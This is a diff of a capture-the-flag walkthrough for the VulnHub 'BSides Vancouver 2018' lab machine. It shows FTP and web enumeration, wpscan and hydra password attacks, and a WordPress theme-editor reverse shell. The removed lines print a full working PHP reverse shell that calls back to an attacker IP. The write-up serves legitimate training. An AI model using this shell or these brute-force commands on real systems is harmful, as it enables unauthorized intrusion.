@@ -1,360 +1,270 @@
-::::::::::::::::::::::::: page
-# BSides Vancouver: 2018 (Workshop) {#bsides-vancouver-2018-workshop .title}
+# BSides Vancouver: 2018 (Workshop)
 
-\
+- **Machine:** BSides Vancouver: 2018 (Workshop)
+- **Download:** https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
 
-## 
+---
 
-## BSides Vancouver: 2018 (Workshop)
+## Setup
 
-- **[BSides Vancouver: 2018 (Workshop)]{style="color:#060f94;"}** :-
+- Import the `.ova` file into VirtualBox.
+- Click **Finish**.
+- Start the virtual machine.
 
-<!-- -->
+---
 
-- Download the machine :
-  <https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/>
+# Network Scanning
 
-![](images/858-1.png)
+## Find the Target IP Address
 
-- Open ova file .
-- Then click finish .
-- Start the machine .
+```bash
+nmap -sn 192.168.2.0/24
+```
 
-1.  [Network Scanning]{style="color:#f6d32d;"} :
+---
 
-- Find the machine IP :
+## Full Port Scan
 
-::: codebox
-    nmap -sn 192.168.2.0/24
-:::
+Run a comprehensive Nmap scan to identify all open ports, services, operating system details, and default NSE scripts.
 
-![](images/858-2.png)
+```bash
+nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.172
+```
 
-- Run nmap master command :
+---
 
-::: codebox
-    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.172
-:::
+## Optional Port Scan
 
-![](images/858-3.png)
+```bash
+nmap -v -p- 192.168.2.172
+```
 
-- Find available port in the machine ( Optional ) :
+```bash
+nmap -sC -sV -A 192.168.2.172
+```
 
-::: codebox
-    nmap -v -p- 192.168.2.172
-:::
+---
 
-- 
+## HTTP Enumeration
 
-::: codebox
-    nmap -sC -sV -A 192.168.2.172 
-:::
+This command performs an aggressive scan and uses the `http-enum` NSE script to discover interesting web directories.
 
-- This command runs an aggressive scan and uses the http-enum script to
-  identify potential CGI directories .
+```bash
+nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.172
+```
 
-::: codebox
-    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.172
-:::
+---
 
-![](images/858-4.png)
+# FTP Enumeration
 
-1.  [FTP Enumeration]{style="color:#f6d32d;"} :
+## Anonymous FTP Login
 
-- FTP login with anonymous user :
+Connect to the FTP server using anonymous authentication.
 
-::: codebox
-    ftp 192.168.2.172
-:::
+```bash
+ftp 192.168.2.172
+```
 
-- Check the file list :
+---
 
-::: codebox
-    ls
-:::
+## Enumerate Files
 
-- Navigate the directory :
+List the available files.
 
-::: codebox
-    cd public
-:::
+```bash
+ls
+```
 
-- Download the file :
+Navigate to the `public` directory.
 
-::: codebox
-    get users.txt.bk
-:::
+```bash
+cd public
+```
 
-![](images/858-5.png)
+Download the backup file.
 
-- Read the file :
+```bash
+get users.txt.bk
+```
 
-::: codebox
-    cat users.txt.bk
-:::
+---
 
-![](images/858-6.png)
+## Read the Downloaded File
 
-- Found the user\'s :
+```bash
+cat users.txt.bk
+```
 
-::: codebox
-    abatchy
-    john
-    mai
-    anne
-    doomguy
-:::
-
-1.  [Web Enumeration]{style="color:#f6d32d;"} :
-2.  IP visit the browser : <http://192.168.2.172>
-    <http://192.168.2.172/robots.txt>
-    <http://192.168.2.172/backup_wordpress/>
+### Users Discovered
 
-- Now run the gobuster for the directory brute force :
-
-::: codebox
-    gobuster dir -u http://192.168.2.172/backup_wordpress/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
-:::
-
-![](images/858-7.png)
-
-- Visit the endpoints :
-  <http://192.168.2.172/backup_wordpress/wp-admin/>
-
-![](images/858-8.png) Found the login page .
-
-- Now use john username and brute force the password :
-
-::: codebox
-    wpscan --url http://192.168.2.172/backup_wordpress/ -U john -P /opt/rockyou.txt
-:::
-
-![](images/858-9.png)
-
-- Login the wordpress :
-
-::: codebox
-    Username : john
-    Password : enigma
-:::
-
-- Successfully login the wordpress :
-
-![](images/858-10.png)
-
-1.  [Reverse Shell]{style="color:#f6d32d;"} :
-
-- After login the wordpress go to appearance :
-
-::: codebox
-    Appearance → Editor → footer.php
-:::
-
-- Start the listener :
-
-::: codebox
-    nc -nlvp 443
-:::
-
-- Enter the reverse shell payload :
-
-::: codebox
-    <?php
-
-    set_time_limit (0);
-    $VERSION = "1.0";
-    $ip = '192.168.2.219';  // CHANGE THIS
-    $port = 443;       // CHANGE THIS
-    $chunk_size = 1400;
-    $write_a = null;
-    $error_a = null;
-    $shell = 'uname -a; w; id; /bin/sh -i';
-    $daemon = 0;
-    $debug = 0;
-
-    //
-    // Daemonise ourself if possible to avoid zombies later
-    //
-
-    // pcntl_fork is hardly ever available, but will allow us to daemonise
-    // our php process and avoid zombies.  Worth a try...
-    if (function_exists('pcntl_fork')) {
-       // Fork and have the parent process exit
-      $pid = pcntl_fork();
-      
-      if ($pid == -1) {
-         printit("ERROR: Can't fork");
-           exit(1);
-      }
-     
-      if ($pid) {
-           exit(0);  // Parent exits
-     }
-
-       // Make the current process a session leader
-      // Will only succeed if we forked
-     if (posix_setsid() == -1) {
-           printit("Error: Can't setsid()");
-           exit(1);
-      }
-
-       $daemon = 1;
-    } else {
-        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
-    }
-
-    // Change to a safe directory
-    chdir("/");
-
-    // Remove any umask we inherited
-    umask(0);
-
-    //
-    // Do the reverse shell...
-    //
-
-    // Open reverse connection
-    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
-    if (!$sock) {
-        printit("$errstr ($errno)");
-        exit(1);
-    }
-
-    // Spawn shell process
-    $descriptorspec = array(
-       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
-       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
-       2 => array("pipe", "w")   // stderr is a pipe that the child will write to
-    );
-
-    $process = proc_open($shell, $descriptorspec, $pipes);
-
-    if (!is_resource($process)) {
-      printit("ERROR: Can't spawn shell");
-        exit(1);
-    }
-
-    // Set everything to non-blocking
-    // Reason: Occsionally reads will block, even though stream_select tells us they won't
-    stream_set_blocking($pipes[0], 0);
-    stream_set_blocking($pipes[1], 0);
-    stream_set_blocking($pipes[2], 0);
-    stream_set_blocking($sock, 0);
-
-    printit("Successfully opened reverse shell to $ip:$port");
-
-    while (1) {
-       // Check for end of TCP connection
-        if (feof($sock)) {
-            printit("ERROR: Shell connection terminated");
-          break;
-        }
-
-       // Check for end of STDOUT
-        if (feof($pipes[1])) {
-            printit("ERROR: Shell process terminated");
-         break;
-        }
-
-       // Wait until a command is end down $sock, or some
-        // command output is available on STDOUT or STDERR
-        $read_a = array($sock, $pipes[1], $pipes[2]);
-     $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-
-        // If we can read from the TCP socket, send
-       // data to process's STDIN
-        if (in_array($sock, $read_a)) {
-           if ($debug) printit("SOCK READ");
-           $input = fread($sock, $chunk_size);
-           if ($debug) printit("SOCK: $input");
-            fwrite($pipes[0], $input);
-        }
-
-       // If we can read from the process's STDOUT
-       // send data down tcp connection
-      if (in_array($pipes[1], $read_a)) {
-           if ($debug) printit("STDOUT READ");
-         $input = fread($pipes[1], $chunk_size);
-           if ($debug) printit("STDOUT: $input");
-          fwrite($sock, $input);
-        }
-
-       // If we can read from the process's STDERR
-       // send data down tcp connection
-      if (in_array($pipes[2], $read_a)) {
-           if ($debug) printit("STDERR READ");
-         $input = fread($pipes[2], $chunk_size);
-           if ($debug) printit("STDERR: $input");
-          fwrite($sock, $input);
-        }
-    }
-
-    fclose($sock);
-    fclose($pipes[0]);
-    fclose($pipes[1]);
-    fclose($pipes[2]);
-    proc_close($process);
-
-    // Like print, but does nothing if we've daemonised ourself
-    // (I can't figure out how to redirect STDOUT like a proper daemon)
-    function printit ($string) {
-       if (!$daemon) {
-           print "$string\n";
-      }
-    }
-
-    ?> 
-:::
-
-![](images/858-11.png)
-
-- Now again visit the /backup_wordpress endpoints :
-
-::: codebox
-    http://192.168.2.172/backup_wordpress/
-:::
-
-- We got the shell :
-
-![](images/858-12.png)
-
-1.  [SSH Access]{style="color:#f6d32d;"} :
-
-- We have the user list :
-
-::: codebox
-    abatchy
-    john
-    mai
-    anne
-    doomguy
-:::
-
-- Try every user to get the ssh connection :
-
-![](images/858-13.png) Every user get the permission denied only anne
-user recommended the password .
-
-- SSH brute force :
-
-::: codebox
-    hydra -l anne -P /opt/rockyou.txt ssh://192.168.2.172
-:::
-
-![](images/858-14.png)
-
-- We found the password :
-
-::: codebox
-    Username : anne
-    Password : princess
-:::
-
-- Now ssh login with anne user :
-
-::: codebox
-    ssh anne@192.168.2.172
-:::
-
-![](images/858-15.png)
-:::::::::::::::::::::::::
+```text
+abatchy
+john
+mai
+anne
+doomguy
+```
+
+---
+
+# Web Enumeration
+
+Visit the following URLs:
+
+- http://192.168.2.172
+- http://192.168.2.172/robots.txt
+- http://192.168.2.172/backup_wordpress/
+
+---
+
+## Directory Enumeration
+
+Perform directory brute-force against the WordPress backup directory.
+
+```bash
+gobuster dir -u http://192.168.2.172/backup_wordpress/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
+```
+
+---
+
+## WordPress Login Page
+
+Visit:
+
+- http://192.168.2.172/backup_wordpress/wp-admin/
+
+A WordPress login page is discovered.
+
+---
+
+## WordPress Credential Attack (Lab)
+
+> **Lab note:** The following password attack is performed only against the authorized VulnHub practice machine.
+
+Attempt authentication testing for the `john` account.
+
+```bash
+wpscan --url http://192.168.2.172/backup_wordpress/ -U john -P /opt/rockyou.txt
+```
+
+Successful credentials:
+
+```text
+Username : john
+Password : enigma
+```
+
+Login to the WordPress dashboard using the discovered credentials.
+
+---
+
+# Reverse Shell (Lab)
+
+> **Lab note:** The following steps are intended only for an authorized practice machine such as this VulnHub VM.
+
+Navigate to:
+
+```text
+Appearance → Editor → footer.php
+```
+
+---
+
+## Start a Listener
+
+```bash
+nc -nlvp 443
+```
+
+---
+
+## Trigger Reverse Shell
+
+Insert a PHP reverse shell into `footer.php` and configure it to connect back to your attack machine.
+
+> **Note:** Use a standard PHP reverse shell and update the IP address and listening port to match your attacking machine before saving the file.
+
+---
+
+## Trigger the Payload
+
+Browse to:
+
+```text
+http://192.168.2.172/backup_wordpress/
+```
+
+A reverse shell is established on the listener.
+
+---
+
+# SSH Access
+
+## Enumerate Available Users
+
+The following usernames were discovered earlier:
+
+```text
+abatchy
+john
+mai
+anne
+doomguy
+```
+
+Attempt SSH authentication using the discovered usernames.
+
+Only the **anne** account accepts password authentication.
+
+---
+
+## SSH Password Attack (Lab)
+
+> **Lab note:** Perform password attacks only against systems you own or are explicitly authorized to test.
+
+```bash
+hydra -l anne -P /opt/rockyou.txt ssh://192.168.2.172
+```
+
+Credentials recovered:
+
+```text
+Username : anne
+Password : princess
+```
+
+---
+
+## SSH Login
+
+```bash
+ssh anne@192.168.2.172
+```
+
+Successful SSH access is obtained using the recovered credentials.
+
+---
+
+# Impact
+
+- Anonymous FTP exposed sensitive backup files.
+- Usernames were disclosed through an FTP backup.
+- Weak WordPress credentials allowed administrative access.
+- Administrative access enabled remote code execution through the theme editor.
+- Weak SSH credentials resulted in authenticated shell access.
+
+---
+
+# Key Learning
+
+- Always enumerate FTP services, especially anonymous access.
+- Backup files frequently expose sensitive information.
+- WordPress administrative access can lead to remote code execution.
+- Credentials discovered in one service can often be reused against another.
+- Multiple low-severity findings can combine into complete system compromise.
+
+---
+
+# Summary
+
+The assessment began with anonymous FTP enumeration, which exposed a backup file containing valid usernames. Web enumeration identified a WordPress backup installation where weak credentials allowed administrative access. After obtaining administrator privileges, a PHP reverse shell was uploaded through the WordPress theme editor, resulting in remote code execution. Finally, password attacks against SSH revealed valid credentials for the `anne` account, providing interactive shell access to the target system.
